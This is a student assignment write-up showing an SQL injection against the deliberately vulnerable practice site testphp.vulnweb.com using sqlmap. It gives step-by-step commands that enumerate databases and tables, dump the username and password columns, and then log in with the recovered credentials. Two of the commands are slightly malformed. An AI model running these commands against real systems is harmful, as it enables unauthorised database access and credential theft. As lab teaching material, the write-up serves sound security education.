# Assignment 1

## Problem Statement
In this assignment, you need to perform an SQL Injection attack. You will use SQLMap tool and [http://www.vulnweb.com](http://www.vulnweb.com) or any other use case of a live vulnerable website. The use of SQLMap within Kali Linux to conduct the attack is necessary for this assignment.  

## Requirements and Dependancies
1. I installed `sqlMap` using the command `pip3 install sqlMap` on my MacOS.
<img width="1319" alt="Screenshot 2022-11-05 at 2 07 05 AM" src="https://user-images.githubusercontent.com/64619851/200082050-27cbe67c-af55-4d86-84fa-a8017d6bd47c.png">

2. I used the `zsh` terminal to run all my commands.

## SQL Injection Attack

### Step 1: Observe the Website
Open the Acuart domain [http://vulnweb.com.](http://vulnweb.com)

### Step 2: Find a Vulnerable Link
We find any link that contacts the backend database through an SQL query. In this case, the link is [http://testphp.vulnweb.com/artists.php?artist=1.](http://testphp.vulnweb.com/artists.php?artist=1)

### Step 3: Locate the Database
I ran the command `sqlmap -u 'testphp.vulnweb.com/artists.php?artist=1' --dbs` to find all the databases. I had to put the URL in quotation marks to make all these commands work in the `zsh` terminal. These commands MAY NOT work for you with the quotation marks.
<img width="1440" alt="Screenshot 2022-11-05 at 2 07 17 AM" src="https://user-images.githubusercontent.com/64619851/200082101-50a35165-53df-40f6-bcb3-4262f6b04623.png">

### Step 4: Locate the Tables
Then, I ran the command `sqlmap -u 'testphp.vulnweb.com/artists.php?artist=1' -D acuart --tables` to identify all the tables in the database.<img width="1440" alt="Screenshot 2022-11-05 at 2 07 51 AM" src="https://user-images.githubusercontent.com/64619851/200082197-98989fad-3cb1-4bd6-9273-e49f91942b44.png">



### Step 5: Focus on Specific Tables
We will focus on the _users_ table by running the command `sqlmap -u 'testphp.vulnweb.com/artists.php?artist=1' --D acuart -T users columns`. This command will show us all the columns in this table.
<img width="1440" alt="Screenshot 2022-11-05 at 2 08 13 AM" src="https://user-images.githubusercontent.com/64619851/200082229-e0501387-5c22-4928-b34d-aab500c11bc7.png">


### Step 6: Dump Information
In the _users_ table, we will dump all the data in the _uname_ and _pass_ by running two commands.
1. `sqlmap -u 'testphp.vulnweb.com/artists.php?artist=1' -D acuart -T users -C uname --dump`
<img width="1440" alt="Screenshot 2022-11-05 at 2 08 31 AM" src="https://user-images.githubusercontent.com/64619851/200082247-724c2eb9-edc8-4645-a0a8-4be6875ff847.png">
2. `sqlmap -u 'testphp.vulnweb.com/artists.php?artist=1' -D acuart -T users -C pass --dump`
<img width="1440" alt="Screenshot 2022-11-05 at 2 08 50 AM" src="https://user-images.githubusercontent.com/64619851/200082257-3d61b418-5c8f-4778-ac7e-c4326a7c680c.png">

By doing this, we find the username and password to both be _test_.

### Step 7: Log In
After succesffuly having executed the SQL Injection Attack, I went to the URL [http://testphp.vulnweb.com/userinfo.php](http://testphp.vulnweb.com/userinfo.php) and logged in using the information I obtained. After logging in, I then changed the information on the website and took a screenshot.
<img width="723" alt="Screenshot 2022-11-05 at 3 12 34 AM" src="https://user-images.githubusercontent.com/64619851/200082563-739daddc-15d1-4122-8247-c3dd742c1a84.png">

## Conclusion
In total, I ran 5 commands.
1. `sqlmap -u 'testphp.vulnweb.com/artists.php?artist=1' --dbs`
2. `sqlmap -u 'testphp.vulnweb.com/artists.php?artist=1' -D acuart --tables`
3. `sqlmap -u 'testphp.vulnweb.com/artists.php?artist=1' --D acuart -T users columns`
4. `sqlmap -u 'testphp.vulnweb.com/artists.php?artist=1' -D acuart -T users -C uname --dump`
5. `sqlmap -u 'testphp.vulnweb.com/artists.php?artist=1' -D acuart -T users -C pass --dump`

